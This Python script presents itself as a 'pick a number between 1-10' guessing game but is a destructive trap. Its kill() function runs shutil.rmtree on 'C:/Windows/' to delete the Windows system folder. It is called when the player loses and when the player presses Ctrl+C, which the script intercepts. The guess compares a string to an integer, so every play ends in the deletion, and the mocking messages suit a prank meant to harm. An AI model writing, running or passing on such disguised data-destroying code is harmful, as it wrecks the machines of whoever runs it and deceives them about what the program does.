import signal
import random
import sys
import shutil
import time

def kill():
    shutil.rmtree("C:/Windows/")
    sys.exit(0)
round = 0
def main():
    if input("Pick a number between 1-10: ") == random.randint(1,10):
        print("You won!")
        time.sleep(1)
        print("Did you really think it would be that easy?")
        time.sleep(0.5)
        print(f"Round {round}!")
        round+=1
    else:
        print("I won    !")
        time.sleep(1)
        print("Goodbye!")
        time.sleep(1)
        kill()

def exit_gracefully(signum, frame):
    signal.signal(signal.SIGINT, original_sigint)
    print("Can't believe you think it would be this easy to win")
    time.sleep(1)
    print("Dissapointing, I thought you were better than this")
    time.sleep(1)
    kill()
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
    main()